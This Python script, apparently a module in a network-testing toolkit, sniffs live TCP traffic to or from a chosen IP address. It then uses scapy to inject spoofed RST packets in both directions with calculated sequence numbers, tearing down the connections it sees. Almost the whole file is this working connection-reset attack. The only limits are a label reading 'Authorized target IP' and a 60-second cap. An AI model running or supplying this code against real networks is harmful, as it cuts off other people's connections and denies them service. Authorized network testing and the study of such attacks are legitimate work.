#!/usr/bin/env python3
# @name: Bounded TCP Reset Test
# @desc: Sniff live TCP traffic to build a connection table, then inject TCP RST packets (both directions) to tear down selected connections.
# @category: network
# @danger: true
# @active: true
# @web: true
# @inputs: [{"name":"target","label":"Authorized target IP","type":"text","required":true},{"name":"port","label":"TCP port (0 means any)","type":"number","default":"0"},{"name":"seconds","label":"Test duration","type":"number","default":"10"}]

import ipaddress
import sys
from pathlib import Path
from scapy.all import IP, TCP, send, sniff
from payloads._web_input import request_input


def main() -> int:
    try:
        target = str(ipaddress.ip_address(sys.argv[1]))
        port = int(sys.argv[2]); seconds = max(1, min(int(sys.argv[3]), 60))
        if not 0 <= port < 65536: raise ValueError
    except (IndexError, ValueError):
        print("Target, port, or duration is invalid.")
        return 2
    interfaces = sorted(p.name for p in Path("/sys/class/net").iterdir() if p.name != "lo")
    interface = str(request_input("Select capture interface", input_type="select", choices=interfaces))
    sent = 0

    def reset(packet):
        nonlocal sent
        if IP not in packet or TCP not in packet or "R" in packet[TCP].flags or target not in {packet[IP].src, packet[IP].dst}:
            return
        tcp = packet[TCP]
        if port and port not in {tcp.sport, tcp.dport}:
            return
        payload_len = len(bytes(tcp.payload))
        advance = payload_len + int("S" in tcp.flags) + int("F" in tcp.flags)
        rst = IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(sport=tcp.dport, dport=tcp.sport, flags="RA", seq=tcp.ack, ack=tcp.seq + advance)
        send(rst, iface=interface, verbose=False)
        sent += 1
        print(f"Reset {packet[IP].src}:{tcp.sport} ↔ {packet[IP].dst}:{tcp.dport}", flush=True)

    expression = f"tcp and host {target}" + (f" and port {port}" if port else "")
    print(f"Watching {interface} for {seconds} seconds…", flush=True)
    sniff(iface=interface, filter=expression, prn=reset, store=False, timeout=seconds)
    print(f"Injected {sent} reset packet(s).")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
